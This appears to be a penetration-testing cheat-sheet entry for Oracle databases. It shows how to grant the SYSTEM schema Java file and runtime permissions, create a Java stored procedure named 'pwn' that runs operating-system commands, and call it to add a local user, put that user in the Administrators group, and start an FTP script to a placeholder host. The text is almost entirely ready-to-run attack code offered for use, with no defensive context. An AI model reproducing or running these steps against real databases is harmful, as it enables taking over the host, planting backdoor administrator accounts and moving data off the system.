Add permissions (sqlPlus required): 
```sql
DECLARE
  l_schema VARCHAR2(30) := 'SYSTEM';
BEGIN
  DBMS_JAVA.grant_permission(l_schema, 'java.io.FilePermission', '<<ALL FILES>>', 'read ,write, execute, delete');
  DBMS_JAVA.grant_permission(l_schema, 'SYS:java.lang.RuntimePermission', 'writeFileDescriptor', '');
  DBMS_JAVA.grant_permission(l_schema, 'SYS:java.lang.RuntimePermission', 'readFileDescriptor', '');
END;
/
```

Java code:
```sql
CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED "pwn" AS
import java.lang.*;
import java.io.*;
 
public class pwn
{
 public static void cmd (String command) throws IOException
 {
     Runtime.getRuntime().exec(command);
 }
};
/
```

Create procedure:
```sql
CREATE OR REPLACE PROCEDURE pwn_cmd (p_command IN VARCHAR2)
AS LANGUAGE JAVA
NAME 'pwn.cmd (java.lang.String)';
/

```

Run command:
```sql
exec pwn_cmd('net user trevelyn trevelyn /add');
exec pwn_cmd('net localgroup Administrators trevelyn /add');
exec pwn_cmd('cmd.exe /c echo open X.X.X.X > C:\ftp.txt'); 
```
